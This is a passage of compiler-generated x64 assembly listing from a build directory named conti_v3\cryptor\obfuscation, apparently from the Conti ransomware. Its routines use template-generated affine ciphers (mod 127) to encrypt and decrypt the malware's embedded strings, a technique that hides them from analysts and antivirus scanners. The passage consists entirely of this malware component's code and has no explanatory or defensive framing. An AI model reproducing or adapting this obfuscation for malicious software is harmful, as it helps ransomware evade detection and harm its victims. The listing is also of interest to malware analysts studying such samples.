?isDecrypted@?$MetaBuffer@$0GL@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 4f 00 00 00	 mov	 ecx, 79			; 0000004fH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4f	 add	 r8d, 79			; 0000004fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 d6	 imul	 r8d, eax, -42		; ffffffffffffffd6H

; 40   :     return (a % n + n) % n;

  00007	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000c	41 f7 e8	 imul	 r8d
  0000f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00014	41 03 d0	 add	 edx, r8d
  00017	c1 fa 06	 sar	 edx, 6
  0001a	8b ca		 mov	 ecx, edx
  0001c	c1 e9 1f	 shr	 ecx, 31
  0001f	03 d1		 add	 edx, ecx
  00021	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00024	44 2b c1	 sub	 r8d, ecx
  00027	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002b	41 f7 e8	 imul	 r8d
  0002e	41 03 d0	 add	 edx, r8d
  00031	c1 fa 06	 sar	 edx, 6
  00034	8b ca		 mov	 ecx, edx
  00036	c1 e9 1f	 shr	 ecx, 31
  00039	03 d1		 add	 edx, ecx
  0003b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0003e	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00041	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 f7 e0	 mul	 r8d
  0000f	41 8b c8	 mov	 ecx, r8d
  00012	2b ca		 sub	 ecx, edx
  00014	d1 e9		 shr	 ecx, 1
  00016	03 ca		 add	 ecx, edx
  00018	c1 e9 06	 shr	 ecx, 6
  0001b	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  0001e	44 2b c1	 sub	 r8d, ecx
  00021	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00025	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 4b	 sub	 eax, 75			; 0000004bH
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4b	 add	 r8d, 75			; 0000004bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 0a	 sub	 eax, 10
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0a	 add	 r8d, 10
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$09U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 0f	 sub	 eax, 15
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0f	 add	 r8d, 15
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
